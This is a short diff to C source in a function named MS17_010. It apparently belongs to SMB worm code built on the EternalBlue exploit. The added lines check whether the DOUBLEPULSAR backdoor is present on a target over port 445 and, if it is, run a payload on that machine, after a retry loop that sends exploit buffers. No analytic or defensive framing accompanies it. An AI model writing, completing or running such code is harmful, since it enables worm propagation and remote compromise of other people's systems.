@@ -123,9 +123,14 @@ DWORD MS17_010(DWORD LPPARAM)
 		      	Sleep(3000);
 		      	trySecondSetBuffers(&target, 445);
 		      	++attemptCount;
-		 }
-		 while ( attemptCount < 5 );
+		 } while ( attemptCount < 5 );
 	}
+	if ( IsDOUBLEPULSARInstalled(&target, 1, 445))
+	{
+		runPayloadOnTarget(&target, 1, 445u);
+	}
+	endthreadex(0);
+	return 0;
 }
 
 
